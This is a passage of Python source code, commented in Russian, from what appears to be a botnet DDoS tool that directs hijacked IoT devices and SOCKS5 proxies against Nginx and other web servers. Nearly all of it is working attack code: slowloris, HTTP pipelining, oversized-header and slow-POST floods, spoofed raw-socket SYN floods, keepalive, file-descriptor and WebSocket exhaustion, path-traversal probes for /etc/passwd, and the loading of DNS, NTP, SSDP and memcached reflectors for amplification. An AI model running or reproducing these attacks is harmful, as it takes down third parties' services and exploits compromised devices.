                # Отправляем частичный HTTP запрос
                partial_request = f"GET /{random.randint(1000, 9999)} HTTP/1.1\r\n".encode()
                partial_request += f"Host: {target_ip}\r\n".encode()
                partial_request += f"User-Agent: {random.choice(self.user_agents)}\r\n".encode()
                partial_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode()
                partial_request += "Accept-Language: en-US,en;q=0.5\r\n".encode()
                partial_request += "Accept-Encoding: gzip, deflate\r\n".encode()
                partial_request += "Connection: keep-alive\r\n".encode()
                
                # НЕ закрываем запрос - оставляем соединение висеть
                conn.send(partial_request)
                
                return conn
            except Exception as e:
                return None

        def create_nginx_buffer_overflow_request(target_ip, target_port, use_https=False):
            """Создает запросы с переполнением буферов Nginx"""
            try:
                if use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    conn = http.client.HTTPSConnection(target_ip, target_port, timeout=10, context=context)
                else:
                    conn = http.client.HTTPConnection(target_ip, target_port, timeout=10)

                # Создаем очень большие заголовки для переполнения буферов
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Host': target_ip,
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    # Большие кастомные заголовки
                    'X-Large-Header-1': 'A' * 8192,  # 8KB заголовок
                    'X-Large-Header-2': 'B' * 4096,  # 4KB заголовок
                    'X-Large-Header-3': 'C' * 2048,  # 2KB заголовок
                    'X-Custom-Data': 'D' * 10240,    # 10KB данных
                }

                # Добавляем множество Location headers для сбоя обработки
                for i in range(10):
                    headers[f'Location-{i}'] = f'http://example.com/path/{random.randint(1000, 9999)}'

                path = f"/{'x' * 500}?{'&'.join([f'param{i}=' + 'y'*100 for i in range(20)])}"
                
                conn.request("GET", path, headers=headers)
                response = conn.getresponse()
                response.read()
                conn.close()
                return True
            except Exception as e:
                return False

        def create_nginx_pipelining_attack(target_ip, target_port, use_https=False):
            """HTTP pipelining атака на Nginx"""
            try:
                if use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    conn = context.wrap_socket(sock, server_hostname=target_ip)
                    conn.connect((target_ip, target_port))
                else:
                    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    conn.settimeout(10)
                    conn.connect((target_ip, target_port))

                # Отправляем множество запросов в одном соединении (pipelining)
                pipelined_requests = ""
                for i in range(50):  # 50 запросов в одном соединении
                    path = f"/api/v{random.randint(1,3)}/data/{random.randint(1000, 9999)}"
                    pipelined_requests += f"GET {path} HTTP/1.1\r\n"
                    pipelined_requests += f"Host: {target_ip}\r\n"
                    pipelined_requests += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    pipelined_requests += "Connection: keep-alive\r\n"
                    pipelined_requests += "\r\n"

                conn.send(pipelined_requests.encode())
                
                # Читаем ответы (не обязательно все)
                try:
                    response = conn.recv(65536)
                except:
                    pass
                    
                conn.close()
                return True
            except Exception as e:
                return False

        def nginx_killer_single(device):
            requests_sent = 0
            connections_created = 0
            slowloris_count = 0
            pipelining_count = 0
            buffer_overflow_count = 0
            failed_requests = 0
            
            try:
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"🎯 {bot_type} {device.ip} начинает NGINX KILLER атаку...")
                start_time = time.time()
                
                slowloris_connections = []
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        attack_type = random.choices(
                            ['slowloris', 'pipelining', 'buffer_overflow', 'mixed'],
                            weights=[0.4, 0.3, 0.2, 0.1]
                        )[0]

                        if attack_type == 'slowloris':
                            # Slowloris атака - создаем медленные соединения
                            conn = create_nginx_slowloris_connection(target_ip, target_port, use_https)
                            if conn:
                                slowloris_connections.append(conn)
                                slowloris_count += 1
                                connections_created += 1
                                attack_stats['slowloris_connections'] += 1
                                attack_stats['total_connections'] += 1

                        elif attack_type == 'pipelining':
                            # HTTP Pipelining атака
                            if create_nginx_pipelining_attack(target_ip, target_port, use_https):
                                pipelining_count += 1
                                requests_sent += 50  # Примерно 50 запросов за pipelining
                                attack_stats['pipelining_requests'] += 50
                                attack_stats['total_requests'] += 50

                        elif attack_type == 'buffer_overflow':
                            # Buffer overflow атака
                            if create_nginx_buffer_overflow_request(target_ip, target_port, use_https):
                                buffer_overflow_count += 1
                                requests_sent += 1
                                attack_stats['buffer_overflow_attempts'] += 1
                                attack_stats['total_requests'] += 1

                        else:  # mixed
                            # Комбинированная атака
                            if random.random() > 0.5:
                                conn = create_nginx_slowloris_connection(target_ip, target_port, use_https)
                                if conn:
                                    slowloris_connections.append(conn)
                                    slowloris_count += 1
                                    connections_created += 1
                            else:
                                if create_nginx_pipelining_attack(target_ip, target_port, use_https):
                                    pipelining_count += 1
                                    requests_sent += 50

                        # Периодически обновляем медленные соединения
                        if random.random() < 0.1 and slowloris_connections:
                            try:
                                conn = random.choice(slowloris_connections)
                                # Добавляем еще заголовки чтобы поддерживать соединение
                                additional_header = f"X-Keep-Alive: {random.randint(1000, 9999)}\r\n".encode()
                                conn.send(additional_header)
                            except:
                                # Удаляем мертвые соединения
                                slowloris_connections = [c for c in slowloris_connections if not c._closed]

                        # Ограничиваем количество медленных соединений
                        if len(slowloris_connections) > 100:
                            # Закрываем старые соединения
                            for _ in range(10):
                                if slowloris_connections:
                                    conn = slowloris_connections.pop(0)
                                    try:
                                        conn.close()
                                    except:
                                        pass

                        time.sleep(random.uniform(0.01, 0.1))
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue

                # Закрываем все медленные соединения в конце
                for conn in slowloris_connections:
                    try:
                        conn.close()
                    except:
                        pass

                print(f"✅ {device.ip} завершил NGINX KILLER: "
                      f"{connections_created} соединений, {requests_sent} запросов, "
                      f"ошибок: {failed_requests}")
                return requests_sent, connections_created

            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        # Запускаем атаку
        results = self._run_attack(all_active_bots, attack_stats, nginx_killer_single, "NGINX KILLER")

        # Детальная статистика
        print(f"\n🎯 NGINX KILLER РЕЗУЛЬТАТЫ:")
        print(f"📊 Всего запросов: {attack_stats['total_requests']}")
        print(f"🔗 Всего соединений: {attack_stats['total_connections']}")
        print(f"🐌 Slowloris соединений: {attack_stats['slowloris_connections']}")
        print(f"🚀 Pipelining запросов: {attack_stats['pipelining_requests']}")
        print(f"💥 Buffer overflow попыток: {attack_stats['buffer_overflow_attempts']}")
        print(f"❌ Ошибок: {attack_stats['failed_requests']}")

        return results

    def nginx_advanced_killer(self, target_ip, target_port=80, use_https=False, duration=60):
        """
        Продвинутая атака на Nginx с использованием специфичных уязвимостей:
        - CVE-2013-2028 (Stack-based buffer overflow)
        - CVE-2017-7529 (Integer overflow)
        - Range header атака
        - HPACK bomb (для HTTP/2)
        """
        print(f"💀 Запуск ADVANCED NGINX KILLER атаки на {target_ip}:{target_port}")
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_requests': 0,
            'vulnerability_exploits': 0,
            'range_header_attacks': 0,
            'http2_attacks': 0,
            'failed_requests': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def create_range_header_attack(target_ip, target_port, use_https=False):
            """Range header атака для обхода кэширования и создания нагрузки"""
            try:
                if use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    conn = http.client.HTTPSConnection(target_ip, target_port, timeout=10, context=context)
                else:
                    conn = http.client.HTTPConnection(target_ip, target_port, timeout=10)

                # Создаем множество range headers для атаки
                range_headers = [
                    "bytes=0-100,100-200,200-300,300-400,400-500",
                    "bytes=-100,100-200,500-600,1000-1100",
                    "bytes=0-1,2-3,4-5,6-7,8-9,10-11",
                    "bytes=0-999999999",  # Очень большой range
                ]

                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Host': target_ip,
                    'Range': random.choice(range_headers),
                    'Connection': 'keep-alive'
                }

                conn.request("GET", "/", headers=headers)
                response = conn.getresponse()
                response.read()
                conn.close()
                return True
            except:
                return False

        def create_nginx_vulnerability_exploit(target_ip, target_port, use_https=False):
            """Эксплуатация известных уязвимостей Nginx"""
            try:
                if use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    conn = http.client.HTTPSConnection(target_ip, target_port, timeout=10, context=context)
                else:
                    conn = http.client.HTTPConnection(target_ip, target_port, timeout=10)

                # Пробуем различные векторы атак
                exploit_paths = [
                    "/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",  # Path traversal
                    "/test{0..1000}.txt",  # Brace expansion attack
                    "/../../../../../../../../etc/passwd",  # Classic path traversal
                    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                ]

                # Специфичные для Nginx заголовки
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Host': target_ip + ':65535',  # Большой порт
                    'Content-Length': '0',
                    'X-Forwarded-For': '127.0.0.1',
                    'X-Real-IP': '127.0.0.1',
                    'Connection': 'keep-alive'
                }

                path = random.choice(exploit_paths)
                conn.request("GET", path, headers=headers)
                response = conn.getresponse()
                response.read()
                conn.close()
                return True
            except:
                return False

        def advanced_nginx_killer_single(device):
            requests_sent = 0
            vulnerability_count = 0
            range_attack_count = 0
            http2_count = 0
            failed_requests = 0
            
            try:
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"💀 {bot_type} {device.ip} начинает ADVANCED NGINX KILLER...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        attack_type = random.choices(
                            ['vulnerability', 'range_attack', 'http2', 'slow_post'],
                            weights=[0.3, 0.3, 0.2, 0.2]
                        )[0]

                        if attack_type == 'vulnerability':
                            if create_nginx_vulnerability_exploit(target_ip, target_port, use_https):
                                vulnerability_count += 1
                                requests_sent += 1
                                attack_stats['vulnerability_exploits'] += 1
                                attack_stats['total_requests'] += 1

                        elif attack_type == 'range_attack':
                            if create_range_header_attack(target_ip, target_port, use_https):
                                range_attack_count += 1
                                requests_sent += 1
                                attack_stats['range_header_attacks'] += 1
                                attack_stats['total_requests'] += 1

                        elif attack_type == 'http2':
                            # HTTP/2 атака если поддерживается
                            try:
                                if self.advanced_http2_killer:
                                    self.advanced_http2_killer(target_ip, target_port, duration=1)
                                    http2_count += 1
                                    attack_stats['http2_attacks'] += 1
                            except:
                                pass

                        else:  # slow_post
                            # Медленная отправка POST данных
                            if create_slow_post_attack(target_ip, target_port, use_https):
                                requests_sent += 1
                                attack_stats['total_requests'] += 1

                        time.sleep(random.uniform(0.05, 0.2))
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue

                print(f"✅ {device.ip} завершил ADVANCED NGINX KILLER: "
                      f"{requests_sent} запросов, {vulnerability_count} эксплойтов, "
                      f"{range_attack_count} range атак")
                return requests_sent, 0

            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        def create_slow_post_attack(target_ip, target_port, use_https=False):
            """Slow POST атака"""
            try:
                if use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    conn = http.client.HTTPSConnection(target_ip, target_port, timeout=30, context=context)
                else:
                    conn = http.client.HTTPConnection(target_ip, target_port, timeout=30)

                # Начинаем отправку большого POST запроса
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Host': target_ip,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': '1000000',  # Объявляем большой контент
                    'Connection': 'keep-alive'
                }

                conn.putrequest('POST', '/upload')
                for header, value in headers.items():
                    conn.putheader(header, value)
                conn.endheaders()

                # Медленно отправляем данные
                for i in range(100):
                    try:
                        chunk = 'x' * 100  # 100 байт за раз
                        conn.send(chunk.encode())
                        time.sleep(0.1)  # Задержка между отправками
                    except:
                        break

                conn.close()
                return True
            except:
                return False

        # Запускаем продвинутую атаку
        results = self._run_attack(all_active_bots, attack_stats, advanced_nginx_killer_single, "ADVANCED NGINX KILLER")

        print(f"\n💀 ADVANCED NGINX KILLER РЕЗУЛЬТАТЫ:")
        print(f"📊 Всего запросов: {attack_stats['total_requests']}")
        print(f"🎯 Уязвимостей эксплойтов: {attack_stats['vulnerability_exploits']}")
        print(f"📏 Range header атак: {attack_stats['range_header_attacks']}")
        print(f"🚀 HTTP/2 атак: {attack_stats['http2_attacks']}")
        print(f"❌ Ошибок: {attack_stats['failed_requests']}")

        return results

    def nginx_worker_killer(self, target_ip, target_port=80, use_https=False, duration=60):
        """
        СМЕРТЕЛЬНАЯ атака на ограничение worker_connections в Nginx
        Каждый worker имеет лимит ~1024-4096 соединений
        """
        print(f"💀 ЗАПУСК NGINX WORKER KILLER НА {target_ip}:{target_port}")
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        
        if not iot_bots:
            print("❌ Нет IoT устройств для raw socket атак!")
            return 0

        attack_stats = {
            'connections_created': 0,
            'syn_sent': 0,
            'workers_exhausted': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def create_tcp_syn_flood(source_ip, dest_ip, dest_port):
            """Массовая отправка SYN пакетов для исчерпания backlog"""
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Создаем SYN пакет
                source_port = random.randint(1024, 65535)
                ip_header = self._create_ip_header(source_ip, dest_ip, 20, socket.IPPROTO_TCP)
                tcp_header = self._create_tcp_syn_header(source_ip, source_port, dest_ip, dest_port)
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (dest_ip, 0))
                sock.close()
                return True
            except:
                return False

        def worker_killer_single(device):
            connections = 0
            syn_packets = 0
            
            try:
                print(f"💀 {device.ip} начинает WORKER KILLER атаку...")
                start_time = time.time()
                
                # Создаем RAW socket для устройства
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    # Генерируем 1000+ SYN пакетов с разных source IP
                    for _ in range(random.randint(50, 200)):
                        source_ip = f"10.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                        
                        if create_tcp_syn_flood(source_ip, target_ip, target_port):
                            syn_packets += 1
                            attack_stats['syn_sent'] += 1
                            connections += 1
                            attack_stats['connections_created'] += 1
                    
                    # Быстрая отправка - 0 задержки
                    time.sleep(0.001)
                
                sock.close()
                print(f"✅ {device.ip} отправил {syn_packets} SYN пакетов")
                return syn_packets, 0
                
            except Exception as e:
                print(f"❌ Ошибка: {e}")
                return 0, 0

        return self._run_attack(iot_bots, attack_stats, worker_killer_single, "NGINX WORKER KILLER")

    def nginx_keepalive_killer(self, target_ip, target_port=80, use_https=False, duration=60):
        """
        Атака на keepalive_timeout - удерживаем соединения вечно
        """
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        all_bots = iot_bots + socks5_bots

        attack_stats = {
            'keepalive_connections': 0,
            'requests_sent': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def keepalive_attack_single(device):
            connections = []
            requests = 0
            
            try:
                print(f"🔗 {device.ip} начинает KEEPALIVE KILLER...")
                start_time = time.time()
                
                # Создаем 100+ keepalive соединений
                for i in range(100):
                    try:
                        if use_https:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            conn = http.client.HTTPSConnection(target_ip, target_port, timeout=30, context=context)
                        else:
                            conn = http.client.HTTPConnection(target_ip, target_port, timeout=30)
                        
                        # Отправляем запрос но НЕ закрываем соединение
                        conn.request("GET", f"/?{random.randint(1000,9999)}", headers={
                            'User-Agent': random.choice(self.user_agents),
                            'Connection': 'keep-alive',
                            'Keep-Alive': 'timeout=3600'
                        })
                        
                        # Читаем ответ но оставляем соединение открытым
                        response = conn.getresponse()
                        response.read()
                        
                        connections.append(conn)
                        attack_stats['keepalive_connections'] += 1
                        requests += 1
                        
                    except:
                        continue
                
                # Держим соединения открытыми всю атаку
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    # Периодически "шевелим" соединения
                    for conn in connections[:10]:  # Только первые 10
                        try:
                            conn.request("GET", f"/ping?{random.randint(1,100)}")
                            response = conn.getresponse()
                            response.read()
                            requests += 1
                            attack_stats['requests_sent'] += 1
                        except:
                            pass
                    time.sleep(5)  # Ждем 5 секунд
                
                # Закрываем соединения
                for conn in connections:
                    try:
                        conn.close()
                    except:
                        pass
                        
                print(f"✅ {device.ip} удержал {len(connections)} соединений")
                return len(connections), 0
                
            except Exception as e:
                print(f"❌ Ошибка: {e}")
                return 0, 0

        return self._run_attack(all_bots, attack_stats, keepalive_attack_single, "KEEPALIVE KILLER")

    def nginx_fd_killer(self, target_ip, target_port=80, duration=60):
        """
        Атака на лимит файловых дескрипторов Nginx
        Каждое соединение = 1 файловый дескриптор
        """
        iot_bots = [d for d in self.iot_bots if d.is_alive]

        attack_stats = {
            'sockets_created': 0,
            'start_time': time.time(), 
            'is_running': True
        }

        def fd_killer_single(device):
            sockets = []
            
            try:
                print(f"📁 {device.ip} начинает FD KILLER...")
                start_time = time.time()
                
                # Создаем максимальное количество сокетов
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем TCP соединение но НЕ завершаем handshake
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        sock.connect((target_ip, target_port))
                        
                        # Отправляем данные но не закрываем
                        sock.send(b"GET / HTTP/1.1\r\n")
                        
                        sockets.append(sock)
                        attack_stats['sockets_created'] += 1
                        
                        # Агрессивно создаем соединения
                        if len(sockets) % 100 == 0:
                            print(f"📁 {device.ip} создал {len(sockets)} сокетов")
                            
                    except:
                        # Продолжаем создавать несмотря на ошибки
                        continue
                
                # Закрываем сокеты
                for sock in sockets:
                    try:
                        sock.close()
                    except:
                        pass
                        
                print(f"✅ {device.ip} создал {len(sockets)} файловых дескрипторов")
                return len(sockets), 0
                
            except Exception as e:
                print(f"❌ Ошибка: {e}")
                return 0, 0

        return self._run_attack(iot_bots, attack_stats, fd_killer_single, "FD KILLER")

    def nginx_ultimate_killer(self, target_ip, target_port=80, use_https=False, duration=120):
        """
        КОМБИНИРОВАННАЯ СМЕРТЕЛЬНАЯ АТАКА:
        1. SYN Flood - исчерпание backlog
        2. Keepalive - удержание соединений  
        3. FD exhaustion - исчерпание дескрипторов
        4. Memory exhaustion - большие запросы
        """
        print(f"☠️ ЗАПУСК ULTIMATE NGINX KILLER НА {target_ip}")
        
        import threading
        
        results = {
            'syn_attack': 0,
            'keepalive_attack': 0, 
            'fd_attack': 0,
            'memory_attack': 0
        }
        
        def run_syn_attack():
            try:
                result = self.nginx_worker_killer(target_ip, target_port, duration)
                results['syn_attack'] = result
            except: pass
        
        def run_keepalive_attack():
            try:
                result = self.nginx_keepalive_killer(target_ip, target_port, use_https, duration)
                results['keepalive_attack'] = result
            except: pass
        
        def run_fd_attack():
            try:
                result = self.nginx_fd_killer(target_ip, target_port, duration)
                results['fd_attack'] = result  
            except: pass
        
        def run_memory_attack():
            try:
                result = self.nginx_memory_killer(target_ip, target_port, use_https, duration)
                results['memory_attack'] = result
            except: pass
        
        # Запускаем все атаки параллельно
        threads = []
        for attack in [run_syn_attack, run_keepalive_attack, run_fd_attack, run_memory_attack]:
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Ждем завершения
        for t in threads:
            t.join(timeout=duration + 10)
        
        total_impact = sum(results.values())
        print(f"☠️ ULTIMATE KILLER РЕЗУЛЬТАТ: {total_impact}")
        print(f"   SYN Flood: {results['syn_attack']}")
        print(f"   Keepalive: {results['keepalive_attack']}") 
        print(f"   FD Attack: {results['fd_attack']}")
        print(f"   Memory: {results['memory_attack']}")
        
        return total_impact

    def websocket_memory_exhaustion(self, target_ip, target_port=443, use_https=True, duration=60):
        """WebSocket Memory Exhaustion атака - истощение памяти через WebSocket соединения"""
        print(f"🕸️ Запуск WebSocket Memory Exhaustion атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_connections': 0,
            'total_messages': 0,
            'total_bytes_sent': 0,
            'active_connections': 0,
            'failed_connections': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def create_websocket_handshake(target_ip, target_port, path="/ws"):
            """Создает WebSocket handshake запрос"""
            handshake_key = base64.b64encode(os.urandom(16)).decode()
            
            handshake_headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {target_ip}:{target_port}",
                "Upgrade: websocket",
                "Connection: Upgrade",
                f"Sec-WebSocket-Key: {handshake_key}",
                "Sec-WebSocket-Version: 13",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Origin: http://" + target_ip,
                "\r\n"
            ]
            
            return "\r\n".join(handshake_headers)
        
        def create_websocket_frame(message, opcode=0x1, masked=True):
            """Создает WebSocket frame"""
            message_bytes = message.encode('utf-8') if isinstance(message, str) else message
            frame = bytearray()
            
            # FIN bit + RSV + Opcode
            frame.append(0x80 | opcode)  # FIN = 1, Opcode = text (0x1)
            
            # Mask bit + Payload length
            if len(message_bytes) <= 125:
                frame.append(0x80 | len(message_bytes))  # Mask = 1
            elif len(message_bytes) <= 65535:
                frame.append(0x80 | 126)  # Mask = 1, Extended payload length
                frame.extend(struct.pack('>H', len(message_bytes)))
            else:
                frame.append(0x80 | 127)  # Mask = 1, Extended payload length
                frame.extend(struct.pack('>Q', len(message_bytes)))
            
            # Masking key
            if masked:
                masking_key = os.urandom(4)
                frame.extend(masking_key)
                
                # Apply mask to payload
                masked_data = bytearray()
                for i, byte in enumerate(message_bytes):
                    masked_data.append(byte ^ masking_key[i % 4])
                frame.extend(masked_data)
            else:
                frame.extend(message_bytes)
            
            return bytes(frame)
        
        def generate_large_websocket_message():
            """Генерирует большое сообщение для истощения памяти"""
            message_types = [
                # Большие JSON объекты
                lambda: json.dumps({"data": "A" * random.randint(10000, 50000)}),
                # Base64 encoded данные
                lambda: base64.b64encode(os.urandom(random.randint(5000, 20000))).decode(),
                # Текст с повторениями
                lambda: "X" * random.randint(10000, 30000),
                # Массив чисел
                lambda: json.dumps({"numbers": [random.randint(1, 1000) for _ in range(1000)]})
            ]
            return random.choice(message_types)()
        
        def websocket_memory_attack(device):
            connections_created = 0
            messages_sent = 0
            bytes_sent = 0
            failed_connections = 0
            active_sockets = []
            
            try:
                print(f"🕸️ {device.ip} начинает WebSocket Memory Exhaustion атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем новое WebSocket соединение
                        if device.bot_type == "socks5" and self.socks5_available:
                            # Через SOCKS5 прокси
                            sock = self._create_socks5_connection(device, target_ip, target_port)
                        else:
                            # Прямое соединение
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(15)
                            sock.connect((target_ip, target_port))
                        
                        if use_https:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            sock = context.wrap_socket(sock, server_hostname=target_ip)
                        
                        # Отправляем WebSocket handshake
                        handshake = create_websocket_handshake(target_ip, target_port)
                        sock.send(handshake.encode())
                        
                        # Читаем ответ handshake
                        response = b""
                        while b"\r\n\r\n" not in response:
                            chunk = sock.recv(4096)
                            if not chunk:
                                break
                            response += chunk
                        
                        if b"101 Switching Protocols" not in response:
                            raise Exception("WebSocket handshake failed")
                        
                        connections_created += 1
                        attack_stats['total_connections'] += 1
                        attack_stats['active_connections'] += 1
                        
                        # Сохраняем сокет для дальнейшего использования
                        active_sockets.append(sock)
                        
                        # Отправляем сообщения через это соединение
                        messages_in_connection = random.randint(10, 50)
                        for i in range(messages_in_connection):
                            if not attack_stats['is_running']:
                                break
                                
                            try:
                                # Генерируем большое сообщение
                                large_message = generate_large_websocket_message()
                                
                                # Создаем и отправляем WebSocket frame
                                frame = create_websocket_frame(large_message)
                                sock.send(frame)
                                
                                messages_sent += 1
                                bytes_sent += len(frame)
                                
                                attack_stats['total_messages'] += 1
                                attack_stats['total_bytes_sent'] += len(frame)
                                
                                # Небольшая задержка между сообщениями
                                time.sleep(random.uniform(0.1, 0.5))
                                
                                # Периодически отправляем ping для поддержания соединения
                                if i % 5 == 0:
                                    ping_frame = create_websocket_frame("", opcode=0x9)
                                    sock.send(ping_frame)
                                    
                            except Exception as e:
                                break
                        
                        # Случайно оставляем некоторые соединения открытыми
                        if random.random() > 0.7 and attack_stats['is_running']:
                            # Держим соединение открытым и периодически отправляем данные
                            keep_alive_start = time.time()
                            while (time.time() - keep_alive_start) < random.randint(30, 120) and attack_stats['is_running']:
                                try:
                                    # Отправляем небольшое сообщение для поддержания соединения
                                    keepalive_msg = json.dumps({"ping": time.time()})
                                    frame = create_websocket_frame(keepalive_msg)
                                    sock.send(frame)
                                    
                                    time.sleep(random.uniform(5, 15))
                                except:
                                    break
                        
                    except Exception as e:
                        failed_connections += 1
                        attack_stats['failed_connections'] += 1
                        continue
                
                # Закрываем все активные соединения
                for sock in active_sockets:
                    try:
                        # Отправляем close frame
                        close_frame = create_websocket_frame("", opcode=0x8)
                        sock.send(close_frame)
                        sock.close()
                        attack_stats['active_connections'] -= 1
                    except:
                        pass
                
                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip} создал {connections_created} WebSocket соединений")
                print(f"   📨 Отправил {messages_sent} сообщений ({mb_sent:.2f} МБ)")
                print(f"   ❌ Ошибок: {failed_connections}")
                
                return messages_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # Запускаем атаку
        results = self._run_attack(
            all_active_bots, 
            attack_stats, 
            websocket_memory_attack, 
            "WebSocket Memory Exhaustion",
            max_workers=min(len(all_active_bots), 5000000000)  # Ограничиваем для избежания перегрузки
        )
        
        # Статистика атаки
        print(f"\n🕸️ WebSocket Memory Exhaustion РЕЗУЛЬТАТЫ:")
        print(f"🔗 Всего соединений: {attack_stats['total_connections']}")
        print(f"📨 Всего сообщений: {attack_stats['total_messages']}")
        print(f"💾 Всего данных: {attack_stats['total_bytes_sent'] / 1024 / 1024:.2f} MB")
        print(f"🔄 Активных соединений: {attack_stats['active_connections']}")
        print(f"❌ Ошибок соединений: {attack_stats['failed_connections']}")
        
        return results

    def load_amplification_servers(self, filename="amplification.txt"):
        """Загружает уязвимые серверы для amplification атак (ДОБАВЛЯЕМ QUIC)"""
        amplification_servers = {
            'CLDAP': [],
            'NTP': [],
            'DNS': [],
            'SSDP': [],
            'CoAP': [],
            'QUIC': []  # ДОБАВЛЯЕМ QUIC
        }
        
        if not os.path.exists(filename):
            print(f"⚠️ Файл {filename} не найден")
            return amplification_servers
        
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Формат: ip:port:protocol
                    parts = line.split(':')
                    if len(parts) >= 3:
                        ip = parts[0].strip()
                        port = int(parts[1].strip())
                        protocol = parts[2].strip().upper()
                        
                        if protocol in amplification_servers:
                            amplification_servers[protocol].append((ip, port))
                            print(f"✅ Загружен {protocol} сервер: {ip}:{port}")
                        else:
                            print(f"⚠️ Неизвестный протокол {protocol} в строке {line_num}")
                    else:
                        print(f"⚠️ Неправильный формат в строке {line_num}: {line}")
            
            # Статистика загрузки
            total_servers = sum(len(servers) for servers in amplification_servers.values())
            print(f"✅ Загружено amplification серверов: {total_servers}")
            for protocol, servers in amplification_servers.items():
                if servers:
                    print(f"   📡 {protocol}: {len(servers)} серверов")
                    
        except Exception as e:
            print(f"❌ Ошибка загрузки amplification серверов: {e}")
        
        return amplification_servers

    def _detect_protocol_by_port(self, port):
        """Определяет протокол по порту"""
        protocol_map = {
            53: "dns", 5353: "mdns",
            123: "ntp",
            1900: "ssdp",
            389: "cldap", 636: "ldaps",
            11211: "memcached",
            19: "chargen",
            17: "qotd",
            5683: "coap", 5684: "coap_dtls",
            11211: "memcached"
        }
        return protocol_map.get(port, "unknown")

    def check_all_amplification_methods(self):
        """Проверяет доступность всех методов amplification"""
        print("🔍 Проверка доступности amplification методов...")
        
        methods = {
            'DNS': self.load_dns_amplifiers, 
            'SSDP': self.load_ssdp_amplifiers,
            'Memcached': self.load_memcached_amplifiers,
            'NTP': lambda: self.load_amplification_servers()['NTP']
        }
        
        available_methods = {}
        
        for name, method in methods.items():
            try:
                servers = method()
                if servers and len(servers) > 0:
                    available_methods[name] = len(servers)
                    print(f"✅ {name}: {len(servers)} серверов")
                else:
                    print(f"❌ {name}: нет серверов")
            except Exception as e:
                print(f"⚠️ {name}: ошибка проверки - {e}")
        
